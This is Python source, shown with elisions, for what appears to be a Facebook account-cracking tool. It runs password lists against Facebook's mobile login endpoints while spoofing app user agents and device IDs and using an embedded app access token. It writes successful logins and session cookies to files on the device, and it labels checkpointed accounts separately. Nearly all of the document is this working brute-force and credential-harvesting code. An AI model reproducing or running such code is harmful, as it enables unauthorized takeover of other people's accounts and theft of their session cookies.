...
os.system('xdg-open https://www.facebook.com/AYANKHAN682')
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
os.system('xdg-open https://www.facebook.com/profile.php?id=100080164765593')
...
\033[1;32m       d8888 Y88b   d88P     d8888 888b    888 
\033[1;32m      d88888  Y88b d88P     d88888 8888b   888 
\033[1;32m     d88P888   Y88o88P     d88P888 88888b  888 
\033[1;32m    d88P 888    Y888P     d88P 888 888Y88b 888 
\033[1;36m   d88P  888     888     d88P  888 888 Y88b888 
\033[1;36m  d88P   888     888    d88P   888 888  Y88888 
\033[1;36m d8888888888    888   d8888888888 888   Y8888 
\033[1;36md88P     888    888  d88P     888 888    Y888 
                                               
                                               
                                               
\033[1;93m🙋🏻‍♀️============\033[1;32m=======#$#========\033[1;93m=============🔥  
\033[1;37m     CREATED BY  :   AYAN  KHAN
     WhatsApp NO :   03108294917
\033[1;36m    Thanks Alot  :   AYAN
\033[1;35m    Tool Version :     3.0
\033[1;32m    TOOL STATUS  :  TOOL IS FREE
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.FSM.etc..')
                                linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [AYAN-] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = '[FBAN/FB4A;FBAV/39.0.0.3628;FBBV/2447545;[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/hr_BA;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]'
                        ...
                        jazoest = li2+j1
                        data={'meta_inf_fbmeta': 'NO_FILE', 'adid': 'DB7E4c4E3CaB4Bce', 'format': 'json', 'device_id': 'df425b5f-7878-485b-b47e-0c59c15cd410', 'cpl': 'true', 'family_device_id': '78541a63-3696-4c4f-8eba-eae13b5d15f2', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'hr_BA', 'client_country_code': 'BA', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                        ...
                        headers={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.3628;FBBV/2447545;[FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/hr_BA;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
                     #   headers={'User-Agent': '[FBAN/FB4A;FBAV/39.0.0.4815;FBBV/7724320;[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/bm_ML;FB_FW/2;FBCR/MY CELCOM;FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '25227', 'X-FB-SIM-HNI': '29752', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}   
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [-AYAN-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AYAN-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AYAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [AYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AYAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/AYAN-CP.txt','a').write(ids+'|'+pas+'\n')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-AYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/AYAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [-AYAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AYAN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AYAN-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [AYAN-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AYAN-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = '[FBAN/FB4A;FBAV/125.0.0.62.122;FBBV/187623456;FBLC/en_US;FBRV/187723456;FBCR/Nepal Telecom;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2239;FBSV/10;FBOP/17;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2034};]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data ={'adid': '22480537-69ec-4297-8dd0-2ae999b4331a', 'method': 'POST', 'format': 'json', 'device_id': '2e5a670b-6a89-4dc4-8b4d-4cc045057c5d', 'family_device_id': 'd5d944f5-fa2c-4347-a75f-96e1864c2123', 'email': ids, 'password': pas, 'cpl': 'true', 'credentials_type': 'password', 'generate_session_cookies': '1', 'error_detail_type': 'button_with_disabled', 'generate_machine_id': '1', 'locale': 'en_US', 'client_country_code': 'US', 'omit_response_on_success': 'false', 'advertising_id': '8f928059-5956-46a4-be34-fff591c71682', 'fb_api_req_friendly_name': 'authenticate'} 
                        headers={'User-Agent': '[FBAN/FB4A;FBAV/125.0.0.62.122;FBBV/187623456;FBLC/en_US;FBRV/187723456;FBCR/Nepal Telecom;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2239;FBSV/10;FBOP/17;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2034};]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'Keep-Alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-graph.facebook.com', 'X-FB-Net-HNI': '45204', 'X-FB-SIM-HNI': '45201', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/AYAN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/AYAN-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
